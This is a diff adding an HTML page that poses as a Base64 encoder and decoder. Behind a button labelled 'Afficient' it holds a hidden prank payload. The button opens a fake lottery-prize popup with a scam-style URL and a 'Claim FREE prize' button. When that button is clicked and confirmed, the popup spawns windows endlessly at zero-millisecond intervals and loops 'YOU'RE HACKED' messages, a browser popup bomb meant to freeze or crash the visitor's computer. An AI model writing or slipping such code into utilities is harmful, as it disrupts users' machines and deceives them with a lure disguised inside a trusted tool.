@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<meta charset="utf-8">
+		<title>Base64 encoder and decoder!</title>
+		<script src="https://25yeht.github.io/cdn/lib/js/jquery-3.6.0.min.js"></script>
+		<style>
+			#r {
+				word-wrap: break-word;
+				font-size: 1px;
+				line-height: 1px;
+				padding: 35px;
+			}
+			br {
+				user-select: none;
+			}
+		</style>
+		</head>
+	<body>
+		<button id="enc">Encode</button>
+		<button id="dec">Decode</button>
+		<button id="af">Afficient</button><br><br>
+		<button id="l42e">Level 42 Encode</button>
+		<button id="l42d">Level 42 Decode</button>
+		
+		<br><br><br>
+		<p id="r"/><br><br><br><br>
+		<script>
+			try {
+				$("#enc").click(() => {
+					var text = prompt("Enter text.");
+					var result;
+					if(text) {
+						try {
+							result = btoa(text.toString("ISO 8859-1").replaceAll("\\n", "\n").replaceAll("/n", "\n"));
+						} catch(e) {
+							alert(e);
+						}
+						if(result) {
+							$("#r").text(result);
+						}
+					}
+				});
+				$("#dec").click(() => {
+					var text = prompt("Enter text.");
+					if(text) {
+						try {
+							var result;
+							if(text.toUpperCase().startsWith("DATA:TEXT/PLAIN;BASE64,")) {
+								result = atob(text.replace("data:text/plain;base64,", "")).toString("ascii");
+							} else if(text.toUpperCase().startsWith("DATA:TEXT/PLAIN;BASE64,")) {
+								result = atob(text.replace("data:text/plain;base64,", "")).toString("ascii");
+							} else if(text.toUpperCase().startsWith("DATA:TEXT/PLAIN;UTF-8,") || text.toUpperCase().startsWith("DATA:TEXT/PLAIN;CHARSET=UTF-8,")) {
+								result = atob(text.replace("data:text/plain;utf-8", "").replace("data:text/plain;charset=utf-8,", "")).toString("ascii");
+							} else if(text.toUpperCase().startsWith("DATA:IMAGE/PNG;BASE64,")) {
+								result = atob(text.replace("data:image/png;base64,", "")).toString("ascii");
+							} else {
+								result = atob(text).toString("ascii");
+							}
+						} catch(error) {
+							alert(error);
+						}
+					}
+					if(result) {
+						alert(result);
+					}
+				});
+				$("#l42e").click(() => {
+					try {
+						var text = prompt("Enter text");
+						if(text) {
+							alert("Please wait... Press [ENTER] or click [OK]");
+							var result = btoa(text);
+							for(var i = 0; i < 41; i++) {
+								result = btoa(result);
+								$("#r").text(result);
+							}
+							alert("Encoded! Now applying text... Press [ENTER] or click [OK]");
+							$("#r").text(result);
+						}
+					} catch(error) {
+						alert(error);
+					}
+				});
+				$("#l42d").click(() => {
+					try {
+						var text = prompt("Enter text");
+						if(text) {
+							var result = atob(text);
+							for(var i = 0; i < 41; i++) {
+								result = atob(result);
+							}
+							alert(result);
+						}
+					} catch(error) {
+						alert(error);
+					}
+				});
+				$("#af").click(() => {
+					var a = open("about:blank/#!/https://lotterypirzez.com/youwin/prize?auth=L9ldi9dlIelpqDidODoiodfJOIDOfldskfjOdioopdiLLIDKFJOoiw6OI&password=389380980983kLLIdufoiODFJO08(&d9$$ooo)", "_blank", "width=525 height=600");
+					var adoc = a.document;
+					adoc.documentElement.lang = "en-US";
+					adoc.documentElement.innerHTML = `
+<head>
+	<title>Loading prize...</title>
+	<style>
+		body {
+			font-family: arial, helvetica, sans-serif;
+			background-color: lightblue;
+			text-align: center;
+		}
+	</style>
+<body>
+<h1>You've won the lottery!</h1><h2>Click below to claim your FREE PRIZE!</h2><br>
+<button id="virus-download-btn">Claim FREE prize! Click now!</button>
+</body>
+</head>
+`;
+					adoc.title = "You've won the lottery! Click to claim your FREE prize!";
+					var ncs = adoc.createElement("script");
+					ncs.innerHTML = `
+function si() {
+	setInterval(si, 1000);
+	document.body.style.backgroundColor = "red";
+	document.body.innerHTML += "YOU'RE HACKED!!!!!!!!! HAR HAR HAR!!!!!<br>";
+}
+document.getElementById("virus-download-btn").addEventListener("click", () => {
+	if(confirm("0% Accurate virus detector: Would you like to crash your computer?")) {
+		setInterval(() => {
+			var a = open("about:blank", "_blank", "width=200, height=200");
+			var ab = a.document.createElement("script");
+			ab.innerHTML = \`
+			setInterval(() => {
+				open("about:blank", "_blank", "width=200, height=200");
+			}, 0);
+
+	\`;
+			a.document.body.appendChild(ab);
+		}, 0);
+		document.body.style.backgroundColor = "red";
+		setTimeout(() => {
+			si();
+			setInterval(() => {
+				close();
+			}, 150000);
+		}, 15);
+	} else {
+		alert("Oh well then.");
+	}
+});
+`;
+					adoc.body.appendChild(ncs);
+					window.location.reload();
+				});
+			} catch(error) {
+				alert(error);
+			}
+		</script>
+	</body>
+</html>
